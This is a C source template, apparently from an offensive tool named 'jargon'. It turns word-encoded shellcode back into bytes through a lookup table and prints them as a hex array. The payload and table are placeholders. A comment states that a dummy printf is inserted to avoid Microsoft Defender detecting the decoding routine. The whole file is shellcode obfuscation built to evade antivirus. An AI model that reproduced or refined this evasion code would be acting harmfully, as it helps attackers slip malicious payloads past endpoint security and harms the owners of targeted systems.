#include <windows.h>
#include <stdio.h>

// compile:
//  cl.exe /nologo /MT /W0 /GS- /DNDEBUG /Tcjargon.c /link /out:jargon.exe /SUBSYSTEM:CONSOLE /MACHINE:x64

int main(void)
{
	unsigned char* translation_table[256] = { ###TRANSLATION_TABLE### };

	unsigned char* translated_shellcode[###SHELLCODE_LENGTH###] = { ###TRANSLATED_SHELLCODE### };

	unsigned char shellcode[###SHELLCODE_LENGTH###] = {0};
	int sc_len = sizeof(shellcode);

    for (int sc_index = 0; sc_index < sc_len; sc_index++) {
		printf(""); // Defender is detecting the translation routine ¯\_(ツ)_/¯
        for (int tt_index = 0; tt_index <= 255; tt_index++) {
                if (strcmp(translation_table[tt_index], translated_shellcode[sc_index]) == 0) {
                        shellcode[sc_index] = tt_index;
                        break;
                }
        }
    }
		
	int idx = 0;
	while ( idx < sizeof(shellcode))
	{
		if (idx == (sizeof(shellcode) - 1) )
		{
			printf("0x%02x ", (unsigned char)shellcode[idx]);
		}
		else
		{
			printf("0x%02x, ", (unsigned char)shellcode[idx]);
		}
		idx++;
	}
}
